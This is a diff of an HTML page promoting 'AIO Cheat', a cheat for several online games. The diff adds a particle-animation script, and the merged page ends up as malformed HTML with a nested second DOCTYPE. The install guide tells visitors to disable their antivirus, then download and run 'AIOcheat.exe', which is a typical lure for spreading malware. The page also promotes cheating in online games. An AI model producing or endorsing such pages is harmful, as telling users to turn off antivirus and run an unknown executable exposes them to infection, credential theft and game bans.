@@ -1,118 +1,192 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The AIO Cheat</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #000;
-            color: #fff;
-        }
-        header {
-            text-align: center;
-            padding: 20px 20px;
-            background-color: #333;
-            color: #3498db;
-        }
-        h1 {
-            font-size: 36px;
-        }
-        section {
-            margin-top: 30px;
-            padding: 20px;
-            background-color: #333;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
-        }
-        h2 {
-            color: #3498db;
-        }
-        ul {
-            list-style-type: none;
-            padding: 0;
-        }
-        ul li {
-            margin-bottom: 10px;
-        }
-        a {
-            display: inline-block;
-            padding: 10px 20px;
-            background-color: #3498db;
-            color: #fff;
-            text-decoration: none;
-            border-radius: 5px;
-            transition: background-color 0.3s;
-        }
-        a:hover {
-            background-color: #2980b9;
-        }
-    </style>
-</head>
-<body>
-
-    <header>
-        <h1>The AIO Cheat</h1>
-        <p>Be the best using this.</p>
-    </header>
-
-    <section>
-        <h2>About AIO Cheat</h2>
-        <p>AIO Cheat is an universal cheat that works for multiple games.</p>
-    </section>
-
-    <section>
-        <h2>AIO Cheat overview</h2>
-        <p>AIO Cheat is compatible with the following games:</p>
-        <ul>
-            <li>Roblox</li>
-            <li>Apex</li>
-            <li>Fortnite</li>
-            <li>GTA 5</li>
-            <li>More soon...</li>
-        </ul>
-    </section>
-
-    <section>
-        <h2>AIO Cheat installing guide</h2>
-        <p>1. Since this is a cheat, antiviruses will detect it as a virus, so if you want to use the AIO Cheat please disable your antivirus.</p>
-        <p>2. Press The download button</p>
-        <p>3. Download the "AIOcheat.exe" file</p>
-        <p>4. Run it</p>
-        <p>5. Enjoy the game!</p>
-    </section>
-
-    <section id="cheat-download">
-        <h2>AIO Cheat download</h2>
-        <p>Press the "Download" button to download the AIO Cheat</p>
-        <!-- Add your enrollment form code here -->
-        <!-- For simplicity, you might want to use a third-party service or a more advanced solution for the form. -->
-
-    <section>
-        <a href="#" onclick="downloadFile()">Download</a>
-    </section>
-
     <script>
-        function downloadFile() {
-            // Replace 'sample.pdf' with the actual file you want to offer for download
-            var fileUrl = 'AIOcheat.exe';
-            
-            // Create a temporary link element
-            var link = document.createElement('a');
-            link.href = fileUrl;
-            link.download = 'AIOcheat.exe'; // Specify the desired file name
-            document.body.appendChild(link);
-            
-            // Trigger the click event to start the download
-            link.click();
-            
-            // Remove the link from the document
-            document.body.removeChild(link);
-        }
+        document.addEventListener('DOMContentLoaded', function () {
+            const canvas = document.createElement('canvas');
+            canvas.id = 'particles-js';
+            document.body.appendChild(canvas);
+    
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+    
+            const particles = [];
+            const particleCount = 100;
+    
+            for (let i = 0; i < particleCount; i++) {
+                particles.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    radius: Math.random() * 3 + 1,
+                    color: 'white',
+                    speedX: Math.random() * 3 - 1.5,
+                    speedY: Math.random() * 3 - 1.5
+                });
+            }
+    
+            function animate() {
+                requestAnimationFrame(animate);
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+    
+                for (let i = 0; i < particles.length; i++) {
+                    ctx.fillStyle = particles[i].color;
+                    ctx.beginPath();
+                    ctx.arc(particles[i].x, particles[i].y, particles[i].radius, 0, Math.PI * 2, false);
+                    ctx.fill();
+    
+                    particles[i].x += particles[i].speedX;
+                    particles[i].y += particles[i].speedY;
+    
+                    if (particles[i].x > canvas.width) particles[i].x = 0;
+                    if (particles[i].x < 0) particles[i].x = canvas.width;
+                    if (particles[i].y > canvas.height) particles[i].y = 0;
+                    if (particles[i].y < 0) particles[i].y = canvas.height;
+                }
+            }
+    
+            animate();
+        });
     </script>
+    
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>The AIO.cheat</title>
+        <style>
+            body {
+                font-family: 'Arial', sans-serif;
+                margin: 0;
+                padding: 0;
+                background-color: #000;
+                color: #fff;
+                position: relative;
+            }
 
-</body>
-</html>
+
+            canvas {
+                position: absolute;
+                top: 0;
+                left: 0;
+                z-index: 0;
+                width: 100%; /* Set canvas width to cover the entire body */
+                height: 100%; /* Set canvas height to cover the entire body */
+            }
+            
+            header {
+                text-align: center;
+                padding: 20px 20px;
+                background-color: #333;
+                color: #3498db;
+                position: relative;
+                z-index: 1; /* Make sure the header is above the canvas */
+            }
+            h1 {
+                font-size: 36px;
+            }
+            section {
+                margin-top: 30px;
+                padding: 20px;
+                background-color: #333;
+                border-radius: 8px;
+                box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+                position: relative;
+                z-index: 1; /* Make sure the sections are above the canvas */
+            }
+            h2 {
+                color: #3498db;
+            }
+            ul {
+                list-style-type: none;
+                padding: 0;
+            }
+            ul li {
+                margin-bottom: 10px;
+            }
+            a {
+                display: inline-block;
+                padding: 10px 20px;
+                background-color: #3498db;
+                color: #fff;
+                text-decoration: none;
+                border-radius: 5px;
+                transition: background-color 0.3s;
+            }
+            a:hover {
+                background-color: #2980b9;
+            }
+        </style>
+    </head>
+    <body>
+    
+        <canvas id="particles-js"></canvas>
+    
+        <header>
+            <h1>The AIO.cheat</h1>
+            <p>Be the best using this.</p>
+        </header>
+    
+        <section>
+            <h2>About AIO.cheat</h2>
+            <p>AIO Cheat is an universal cheat that works for multiple games.</p>
+        </section>
+    
+        <section>
+            <h2>AIO.cheat overview</h2>
+            <p>AIO Cheat is compatible with the following games:</p>
+            <ul>
+                <li>Roblox</li>
+                <li>Apex</li>
+                <li>Fortnite</li>
+                <li>GTA 5</li>
+                <li>More soon...</li>
+            </ul>
+        </section>
+    
+        <section>
+            <h2>AIO.cheat installing guide</h2>
+            <p>1. Since this is a cheat, antiviruses will detect it as a virus, so if you want to use the AIO Cheat please disable your antivirus.</p>
+            <p>2. Press The download button</p>
+            <p>3. Download the "AIOcheat.exe" file</p>
+            <p>4. Run it</p>
+            <p>5. Enjoy the game!</p>
+        </section>
+    
+        <section id="cheat-download">
+            <h2>AIO Cheat download</h2>
+            <p>Press the "Download" button to download the AIO.cheat</p>
+            <!-- Add your enrollment form code here -->
+            <!-- For simplicity, you might want to use a third-party service or a more advanced solution for the form. -->
+            <a href="#" onclick="downloadFile()">Download</a>
+        </section>
+    
+        <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+        <script>
+            particlesJS('particles-js', {
+                // Particle configuration goes here
+            });
+        </script>
+    
+        <script>
+            function downloadFile() {
+                // Replace 'AIOcheat.exe' with the actual file you want to offer for download
+                var fileUrl = 'AIOcheat.exe';
+                
+                // Create a temporary link element
+                var link = document.createElement('a');
+                link.href = fileUrl;
+                link.download = 'AIOcheat.exe'; // Specify the desired file name
+                document.body.appendChild(link);
+                
+                // Trigger the click event to start the download
+                link.click();
+                
+                // Remove the link from the document
+                document.body.removeChild(link);
+            }
+        </script>
+    
+    </body>
+    </html>
+    
